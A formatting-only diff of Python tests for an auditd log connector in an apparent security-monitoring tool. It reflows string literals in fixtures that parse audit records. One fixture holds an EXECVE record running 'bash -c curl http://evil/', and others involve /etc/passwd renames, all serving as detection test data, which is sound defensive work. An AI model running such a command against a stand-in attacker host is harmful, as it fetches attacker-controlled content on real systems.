@@ -52,7 +52,6 @@ from app.connectors.auditd import (
 )
 from app.connectors.base import Capability
 
-
 # ---------------------------------------------------------------------------
 # Schema / capabilities contract
 # ---------------------------------------------------------------------------
@@ -143,10 +142,7 @@ def test_parse_record_returns_empty_for_malformed_line():
 
 
 def test_parse_record_extracts_argv_slot_keys():
-    line = (
-        'type=EXECVE msg=audit(1.0:1): argc=3 a0="bash" a1="-c" '
-        'a2="curl http://evil/"'
-    )
+    line = 'type=EXECVE msg=audit(1.0:1): argc=3 a0="bash" a1="-c" a2="curl http://evil/"'
     _, record_type, fields = _parse_record(line)
     assert record_type == "EXECVE"
     assert fields["a0"] == "bash"
@@ -276,8 +272,7 @@ def test_assemble_keeps_multiple_path_records_for_rename():
     and promote the first to the singular ``path`` for the common case.
     """
     records = _make_records(
-        "type=SYSCALL msg=audit(1.0:1): arch=c000003e syscall=82 "
-        'comm="mv" exe="/usr/bin/mv"',  # 82 = rename
+        'type=SYSCALL msg=audit(1.0:1): arch=c000003e syscall=82 comm="mv" exe="/usr/bin/mv"',  # 82 = rename
         'type=PATH msg=audit(1.0:1): item=0 name="/etc/passwd.bak"',
         'type=PATH msg=audit(1.0:1): item=1 name="/etc/passwd"',
     )
@@ -442,9 +437,7 @@ def test_severity_exec_from_legitimate_path_is_info():
     """An ``execve`` from /usr/bin should not trip the exec-from-temp
     heuristic — that's normal user activity.
     """
-    assert (
-        _severity_from_event({"syscall": "execve", "exe": "/usr/bin/ls"}) == "info"
-    )
+    assert _severity_from_event({"syscall": "execve", "exe": "/usr/bin/ls"}) == "info"
 
 
 def test_severity_unknown_key_falls_through_to_info():
@@ -829,11 +822,7 @@ async def test_fetch_alerts_skips_malformed_lines(tmp_path: Path):
     batch — it's silently dropped and surrounding events round-trip.
     """
     audit_log = tmp_path / "audit.log"
-    body = (
-        _execve_block("1.0", "1")
-        + "this line is not an audit record\n"
-        + _execve_block("2.0", "2")
-    )
+    body = _execve_block("1.0", "1") + "this line is not an audit record\n" + _execve_block("2.0", "2")
     _write_log(audit_log, body)
     conn = AuditdConnector(
         host_label="prod-web-01",
